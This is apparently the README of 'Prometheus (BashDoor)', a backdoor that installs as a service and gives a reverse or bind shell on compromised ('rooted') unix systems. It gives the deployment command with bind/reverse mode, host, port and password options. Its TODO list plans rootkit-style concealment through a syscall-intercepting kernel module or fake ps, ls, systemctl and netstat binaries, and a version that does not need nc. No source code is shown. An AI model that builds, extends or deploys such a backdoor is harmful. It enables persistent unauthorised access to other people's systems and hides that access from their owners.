# Prometheus (BashDoor)
Prometheus is a reverse/bind shell service backdoor to quickly deploy on rooted unix systems.

deploy.sh, n0sl33p_default and prometheus.service need to be all in the same folder.

Then deploy with:
`sudo ./deploy [bind/reverse] [PORT/HOST] [PASSWORD/PORT] (RETRYTIME if reverse)`

#
### TODO:

-> Add a kernel module to intercept syscalls or make fake "ps", "ls", "systemctl", "netstat" binaries to hide all files and processes

-> Make a nc-less version

-> Improve error-handling, make shell prettier
